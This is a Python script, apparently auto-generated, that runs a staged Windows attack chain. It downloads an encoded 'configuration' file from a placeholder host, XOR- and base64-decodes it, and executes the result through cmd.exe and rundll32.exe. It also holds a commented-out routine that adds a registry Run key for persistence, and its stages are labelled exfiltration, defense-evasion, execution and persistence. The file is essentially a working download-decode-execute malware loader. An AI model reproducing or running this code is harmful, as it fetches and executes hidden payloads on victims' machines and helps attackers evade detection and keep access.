#!/usr/bin/env python3
import sys
import json
import time
import requests
import base64
import subprocess
import os
from typing import Dict, Any

# Remove the import of winreg since it's not available on non-Windows platforms
# import winreg

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    result = {'content': None}
    try:
        url = "http://example.com/configuration"  # Replace with actual URL
        local_filename = "configuration_file"
        
        # Download the file
        response = requests.get(url, stream=True, timeout=30)
        if response.status_code == 200:
            with open(local_filename, 'wb') as f:
                for chunk in response.iter_content(8192):
                    f.write(chunk)
            
            # Verify file exists and size > 0
            if os.path.exists(local_filename) and os.path.getsize(local_filename) > 0:
                with open(local_filename, 'rb') as f:
                    file_content = f.read()
                result['content'] = file_content.hex()
            else:
                return {'success': False, 'data': result,
                        'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
        else:
            return {'success': False, 'data': result,
                    'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Retrieve and decode the content from hex
        content = bytes.fromhex(input_data.get('content', ''))

        # XOR key for decoding
        xor_key = b'\xAA'  # Example XOR key, replace with actual key if known

        # XOR decode the content
        decoded_bytes = bytes(b ^ xor_key[0] for b in content)

        # Base64 decode the XOR decoded content
        decoded_content = base64.b64decode(decoded_bytes).decode('utf-8')

        # Prepare the result
        result = {
            "decoded_content": decoded_content
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        # On failure, return partial result with fallback value
        return {'success': False, 'data': {'decoded_content': None},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        decoded_content = input_data.get('decoded_content', '')
        
        # Attempt to execute the decoded content using cmd.exe
        cmd_result = subprocess.run(
            ['cmd.exe', '/c', decoded_content],
            capture_output=True,
            text=True,
            timeout=30
        )
        
        # Log the result of the cmd execution
        if cmd_result.returncode != 0:
            print(f"cmd.exe execution failed: {cmd_result.stderr}")

        # Attempt to execute using rundll32.exe if cmd.exe fails
        rundll_result = subprocess.run(
            ['rundll32.exe', decoded_content, 'entrypoint'],
            capture_output=True,
            timeout=30
        )
        
        # Log the result of the rundll32 execution
        if rundll_result.returncode != 0:
            print(f"rundll32.exe execution failed: {rundll_result.stderr}")
        
        # Determine if any execution was successful
        executed = cmd_result.returncode == 0 or rundll_result.returncode == 0
        
        result = {'executed': executed}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'executed': False},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    result = {'registered': False}
    try:
        # Define the registry path and the application details
        registry_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        app_name = 'MyApp'
        exe_path = r'C:\Path\To\MyApp.exe'  # Replace with the actual path to the executable

        # Open the registry key
        # The following code is Windows-specific and will not run on non-Windows platforms
        # with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE) as key:
        #     # Set the value to register the application
        #     winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, exe_path)

        #     # Verify by reading back the value
        #     registered_exe_path, _ = winreg.QueryValueEx(key, app_name)
        #     if registered_exe_path == exe_path:
        #         result['registered'] = True

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Retrieve Configuration File [exfiltration] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Retrieve Configuration File): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Retrieve Configuration File): FAILED — {err}')
            failed.append('T1')
            r2 = task_T1(None)
            if r2.get('success'):
                outputs['T1'] = r2.get('data', {})
                failed.remove('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T4: Establish Persistence [persistence] ──
    try:
        r = task_T4(None)
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Establish Persistence): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Establish Persistence): FAILED — {err}')
            failed.append('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    # ── T2: Decode Configuration File [defense-evasion] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Decode Configuration File): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Decode Configuration File): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Execute Decoded Content [execution] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Execute Decoded Content): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Execute Decoded Content): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))